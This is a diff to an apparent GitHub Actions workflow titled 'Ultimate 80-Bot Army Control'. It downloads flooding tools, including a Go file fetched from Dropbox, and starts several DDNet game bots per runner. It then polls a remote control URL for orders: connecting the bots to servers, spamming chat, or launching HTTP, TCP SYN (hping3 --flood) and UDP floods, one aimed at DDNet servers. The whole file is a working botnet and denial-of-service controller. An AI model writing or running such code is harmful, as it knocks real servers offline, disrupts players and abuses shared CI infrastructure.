@@ -1,4 +1,4 @@
-name: Ultimate 20-Machine Control
+name: Ultimate 80-Bot Army Control
 on:
   workflow_dispatch:
 
@@ -22,10 +22,9 @@ jobs:
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
           wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
           
-          echo "Fetching DDNet..."
-          LINK=$(curl -s https://ddnet.org/downloads/ | grep -oP 'href="\K[^"]+linux_x86_64\.tar\.xz' | head -n 1)
-          if [[ "$LINK" == http* ]]; then FINAL_URL="$LINK"; else FINAL_URL="https://ddnet.org/downloads/$(basename $LINK)"; fi
-          wget -O ddnet.tar.xz "$FINAL_URL"
+          RAW_LINK=$(curl -s https://ddnet.org/downloads/ | grep -oP 'href="\K[^"]+linux_x86_64\.tar\.xz' | head -n 1)
+          if [[ "$RAW_LINK" == http* ]]; then FULL_URL="$RAW_LINK"; else FULL_URL="https://ddnet.org/downloads/$(basename $RAW_LINK)"; fi
+          wget -O ddnet.tar.xz "$FULL_URL"
           tar -xf ddnet.tar.xz
           mv DDNet-* ddnet_folder
 
@@ -39,13 +38,14 @@ jobs:
           export LIBGL_ALWAYS_SOFTWARE=1
 
           cd ddnet_folder
-          for i in {1..2}; do
+          for i in {1..4}; do
             cat << EOF > "bot${i}.cfg"
             cl_show_welcome 0; cl_motd_time 0; gfx_screen_width 640; gfx_screen_height 480;
             player_name "Panda_${{ matrix.machine }}_$i"; cl_dummy_name "DUM_${{ matrix.machine }}_$i";
             cl_dummy 1; cl_auto_ready 1; snd_enable 0;
           EOF
             ./DDNet -f "bot${i}.cfg" > /dev/null 2>&1 & 
+            sleep 1
           done
 
           echo "READY..."
@@ -53,40 +53,44 @@ jobs:
           
           while true; do
             RESPONSE=$(curl -s --max-time 5 "$CONTROL_URL")
-            ID=$(echo "$RESPONSE" | jq -r '.id // 0')
+            
+            # Проверка: если это валидный JSON, работаем дальше
+            if echo "$RESPONSE" | jq -e . >/dev/null 2>&1; then
+              ID=$(echo "$RESPONSE" | jq -r '.id // 0')
 
-            if [[ "$ID" != "$LAST_ID" && "$ID" != "0" ]]; then
-              LAST_ID=$ID
-              TYPE=$(echo "$RESPONSE" | jq -r '.type')
-              TARGET=$(echo "$RESPONSE" | jq -r '.target')
-              PORT=$(echo "$RESPONSE" | jq -r '.port')
-              CONNS=$(echo "$RESPONSE" | jq -r '.conns')
-              MSG=$(echo "$RESPONSE" | jq -r '.msg')
+              if [[ "$ID" != "$LAST_ID" && "$ID" != "0" ]]; then
+                LAST_ID=$ID
+                TYPE=$(echo "$RESPONSE" | jq -r '.type')
+                TARGET=$(echo "$RESPONSE" | jq -r '.target')
+                PORT=$(echo "$RESPONSE" | jq -r '.port')
+                CONNS=$(echo "$RESPONSE" | jq -r '.conns')
+                MSG=$(echo "$RESPONSE" | jq -r '.msg')
 
-              if [[ "$TYPE" == "connect" || "$TYPE" == "chat" || "$TYPE" == "disconnect" || "$TYPE" == "key" ]]; then
-                WIDS=$(xdotool search --class "DDNet" 2>/dev/null || echo "")
-                for WID in $WIDS; do
-                  xdotool windowactivate --sync $WID
-                  if [ "$TYPE" == "connect" ]; then
-                    xdotool key F1; sleep 0.2; xdotool type "connect $TARGET"; xdotool key Return; xdotool key F1
-                  elif [ "$TYPE" == "chat" ]; then
-                    xdotool key t; sleep 0.3; xdotool type "$MSG"; xdotool key Return
-                  elif [ "$TYPE" == "disconnect" ]; then
-                    xdotool key F1; sleep 0.2; xdotool type "disconnect"; xdotool key Return; xdotool key F1
-                  elif [ "$TYPE" == "key" ]; then
-                    xdotool key "$MSG"
-                  fi
-                done
-              fi
+                if [[ "$TYPE" == "connect" || "$TYPE" == "chat" || "$TYPE" == "disconnect" || "$TYPE" == "key" ]]; then
+                  WIDS=$(xdotool search --class "DDNet" 2>/dev/null || echo "")
+                  for WID in $WIDS; do
+                    xdotool windowactivate --sync $WID 2>/dev/null
+                    if [ "$TYPE" == "connect" ]; then
+                      xdotool key --window $WID F1; sleep 0.2; xdotool type --window $WID "connect $TARGET"; xdotool key --window $WID Return; xdotool key --window $WID F1
+                    elif [ "$TYPE" == "chat" ]; then
+                      xdotool key --window $WID t; sleep 0.2; xdotool type --window $WID "$MSG"; xdotool key --window $WID Return
+                    elif [ "$TYPE" == "disconnect" ]; then
+                      xdotool key --window $WID F1; sleep 0.2; xdotool type --window $WID "disconnect"; xdotool key --window $WID Return; xdotool key --window $WID F1
+                    elif [ "$TYPE" == "key" ]; then
+                      xdotool key --window $WID "$MSG"
+                    fi
+                  done
+                fi
 
-              if [ "$TYPE" == "http" ]; then
-                bombardier -c $CONNS -d 600s --http2 -l "$TARGET" &
-              elif [ "$TYPE" == "tcp" ]; then
-                sudo hping3 --flood -S -p $PORT $TARGET &
-              elif [ "$TYPE" == "udp" ]; then
-                go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 600s -r 0 -t 1s &
-              elif [ "$TYPE" == "udp-ddnet" ]; then
-                go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 600s -r 0 -t 1s &
+                if [ "$TYPE" == "http" ]; then
+                  bombardier -c $CONNS -d 600s --http2 -l "$TARGET" &
+                elif [ "$TYPE" == "tcp" ]; then
+                  sudo hping3 --flood -S -p $PORT $TARGET &
+                elif [ "$TYPE" == "udp" ]; then
+                  go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 600s -r 0 -t 1s &
+                elif [ "$TYPE" == "udp-ddnet" ]; then
+                  go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 600s -r 0 -t 1s &
+                fi
               fi
             fi
             sleep 3
